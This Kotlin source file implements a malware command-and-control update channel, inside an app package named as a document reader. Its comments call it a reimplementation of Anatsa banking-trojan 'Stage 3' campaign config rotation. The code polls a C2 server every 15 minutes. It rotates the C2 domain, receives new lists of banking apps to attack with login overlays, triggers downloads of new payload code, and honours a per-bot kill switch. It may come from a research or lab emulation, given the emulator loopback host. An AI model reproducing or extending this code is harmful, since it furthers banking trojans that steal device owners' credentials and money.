package com.docreader.lite.reader.sync

import kotlinx.coroutines.*
import okhttp3.OkHttpClient
import okhttp3.Request
import org.json.JSONObject
import java.util.concurrent.TimeUnit

/**
 * Update channel — Anatsa Stage 3 mid-campaign config rotation.
 *
 * Once malware is deployed to 200K+ devices, operator needs to:
 *   - Rotate C2 domain (old one flagged)
 *   - Push new target list (new banking apps to target)
 *   - Push new overlay HTML (updated bank login templates)
 *   - Push payload updates (new DEX with bug fixes / new features)
 *   - Kill switch (disable specific bot IDs)
 *
 * Polling cadence: Anatsa ~15min, SharkBot ~1hr.
 * Channel is distinct from command poll — commands are per-bot instructions,
 * update channel is campaign-wide config broadcast.
 */
object UpdateChannel {

    private val client = OkHttpClient.Builder()
        .connectTimeout(5, TimeUnit.SECONDS)
        .readTimeout(10, TimeUnit.SECONDS)
        .build()

    private val scope = CoroutineScope(Dispatchers.IO + SupervisorJob())
    private var pollJob: Job? = null

    @Volatile
    var currentVersion = 0
        private set

    @Volatile
    var currentC2Host = "10.0.2.2"
        private set

    @Volatile
    var currentC2Port = 8080
        private set

    data class UpdateConfig(
        val version: Int,
        val newC2Host: String?,
        val newC2Port: Int?,
        val newTargets: List<TargetUpdate>?,
        val newPayloadUrl: String?,
        val killBotIds: List<String>?,
    )

    data class TargetUpdate(
        val packageName: String,
        val name: String,
        val overlayType: String,
    )

    /**
     * Start periodic update channel poll.
     */
    fun startPolling(baseUrl: String, intervalMs: Long = 900_000L) { // 15 min default
        pollJob?.cancel()
        pollJob = scope.launch {
            while (isActive) {
                checkForUpdate(baseUrl)
                delay(intervalMs)
            }
        }
    }

    fun stopPolling() {
        pollJob?.cancel()
        pollJob = null
    }

    private suspend fun checkForUpdate(baseUrl: String) {
        try {
            val req = Request.Builder()
                .url("$baseUrl/api/v1/update?v=$currentVersion")
                .header("X-Bot-Id", android.os.Build.MODEL)
                .build()
            val resp = client.newCall(req).execute()
            val body = resp.body?.string() ?: return
            resp.close()

            if (body.isBlank() || body == "{}") return

            val json = JSONObject(body)
            val serverVersion = json.optInt("version", 0)

            // Only apply if newer
            if (serverVersion <= currentVersion) return

            applyUpdate(json)
            currentVersion = serverVersion
        } catch (_: Exception) {}
    }

    private fun applyUpdate(json: JSONObject) {
        // C2 rotation
        val newHost = json.optString("c2_host", "")
        if (newHost.isNotEmpty()) {
            currentC2Host = newHost
        }
        val newPort = json.optInt("c2_port", 0)
        if (newPort > 0) {
            currentC2Port = newPort
        }

        // Target list update
        val targets = json.optJSONArray("targets")
        if (targets != null) {
            val updates = mutableListOf<TargetUpdate>()
            for (i in 0 until targets.length()) {
                val t = targets.getJSONObject(i)
                updates.add(TargetUpdate(
                    t.getString("package"),
                    t.optString("name", ""),
                    t.optString("overlay_type", "LOGIN"),
                ))
            }
            onTargetsUpdated?.invoke(updates)
        }

        // Payload update trigger
        val payloadUrl = json.optString("payload_url", "")
        if (payloadUrl.isNotEmpty()) {
            onPayloadAvailable?.invoke(payloadUrl)
        }

        // Kill switch
        val killList = json.optJSONArray("kill_bot_ids")
        if (killList != null) {
            val ids = (0 until killList.length()).map { killList.getString(it) }
            val myId = android.os.Build.MODEL + "_" + android.os.Build.SERIAL
            if (myId in ids) {
                onKillSwitch?.invoke()
            }
        }
    }

    // Callbacks for update events
    var onTargetsUpdated: ((List<TargetUpdate>) -> Unit)? = null
    var onPayloadAvailable: ((String) -> Unit)? = null
    var onKillSwitch: (() -> Unit)? = null
}
